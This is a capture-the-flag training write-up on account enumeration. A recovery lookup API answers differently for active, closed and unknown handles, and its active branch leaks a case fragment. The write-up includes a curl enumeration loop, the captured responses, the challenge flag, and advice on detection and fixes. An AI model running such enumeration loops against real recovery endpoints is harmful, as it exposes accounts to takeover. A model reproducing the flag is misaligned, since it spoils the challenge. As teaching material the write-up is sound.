# T02.1 — An account by any other response

> **Category:** 1. Training · **Points:** 50 · **Difficulty:** easy
> **Solved by:** me (manual)

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Account enumeration through a detailed recovery API — the lookup separates *active*, *gone* and *unknown* handles by status and body, and the active branch returns the account-bound case reference |
| **Tools** | `curl`, `jq`, shell loops |
| **Attack surface** | `http://accounts.training:8080/candidates.md`, `POST /api/recovery/lookup` (10.77.40.30) |
| **Prerequisite** | The candidate list the desk publishes; no session |
| **Flag** | `FLAG{7502f8e82360c288}` |

**What you are about to read:** how a recovery endpoint that answers "does this account exist?"
three different ways becomes an enumeration oracle, and how its active branch hands over the first
half of a takeover.

## Objective

> Identify the active rehearsal account and recover the account-bound case reference the
> identity desk exposes.

The identity desk documents a rehearsal recovery flow. The card is reconnaissance: find the live
rehearsal account and extract the recovery fragment the workflow is built around.

## Background you need

- **Enumeration oracles** are endpoints whose response differs depending on whether an
  identifier exists — status code, message, length, or a field on one branch only.
- **Three-state vs two-state.** A careful login returns one answer for "bad user" and "bad
  password"; a helper that separates `200 active`, `410 inactive` and `404 unknown`
  re-introduces the distinction the login worked to hide.
- **Recovery flows concentrate secrets:** the service checks something the user knows, often
  stable and stored beside the account. Rate limiting is no fix when the candidate space is
  tiny and published.

## Walkthrough

### 1. Recon — the front page documents the API

```bash
H=http://accounts.training:8080
curl -sS $H/ | head -40        # markdown root: it lists its own endpoints
```

It advertises `/candidates.md`, `/directory/`, `POST /api/recovery/lookup`,
`POST /api/recovery/redeem`, `GET /api/handover` and `GET /api/assignments`, authenticated by
the `CINDER_REHEARSAL_SESSION` cookie or bearer (server `CinderTraining/1.0`).

```bash
curl -sS $H/candidates.md
# mina.cho   — departure paperwork
# rhea.moss  — Bay 4 rehearsal
# owen.pike  — spelling from unsigned note
```

### 2. Finding the flaw — three statuses for three states

Query each candidate and record *status and body*, not just "does it work":

```bash
for a in mina.cho rhea.moss owen.pike; do
  printf '%-12s ' "$a"
  curl -sS -o /tmp/o -w '%{http_code} ' -H 'Content-Type: application/json' \
       -d "{\"account\":\"$a\"}" "$H/api/recovery/lookup"; cat /tmp/o; echo
done
```

```
200 {"account":"rhea.moss","case_fragment":"CASE-7Q4M","flag":"FLAG{7502f8e82360c288}","state":"active"}
410 {"state":"inactive"}
404 {"state":"unknown"}
```

`410 Gone` (`mina.cho`) vs `404 Not Found` (`owen.pike`, and any random handle) is the bug in one
line: the service tells an unauthenticated caller that a handle was *once real* — and the active
branch returns the account-bound `case_fragment` the workflow expects.

### 3. Exploitation — take the fragment, leave the rest

```bash
curl -sS -H 'Content-Type: application/json' -d '{"account":"rhea.moss"}' \
     "$H/api/recovery/lookup" | jq -r .case_fragment     # CASE-7Q4M
```

No brute force: the desk published the candidate set, and a random handle confirms `404`.

### 4. Getting the flag

The `200` body carries the flag next to the fragment: `FLAG{7502f8e82360c288}` (the fragment is
T02.3's input).

## Why this works (the vulnerability explained)

Two failures compound. First, **the service is a state oracle**: recovery lookups tell an attacker
which accounts are worth attacking and which are dead, where the safe design returns one
indistinguishable answer ("if that account exists, a message has been sent"). Second, **the
fragment is disclosed to an unauthenticated caller** — "account-bound" is worthless if anyone can
read it by naming the account, and it is one of the two values the redeem step (T02.3) needs.
Each response looks defensible alone; the composition is an authentication bypass.

## Detection and fix

- **Detection:** many `POST /api/recovery/lookup` calls from one source against distinct
  handles with a high `404`/`410` ratio — alert on the pattern, not one failed lookup.
- **Fix:** one response shape and status for every input — `202` with "if the account exists, a
  recovery message has been sent" — work done server-side. Never return account state or
  recovery material to an unauthenticated caller; deliver fragments to the verified contact
  channel. Rate-limit per source, count per account, make fragments single-use.

## Notes and dead ends

- Facts come from the identity-desk lane report and notes (captured status codes and bodies).
  The request must be JSON — a form post gets a generic error.
- Do not enumerate a wider handle space: lookups are exact-match and the desk holds only
  `STF-204`/`STF-317`. The productive input was the published list.
- `410` is a *success* code: it proves prior existence, and closed accounts' identifiers usually
  survive elsewhere.
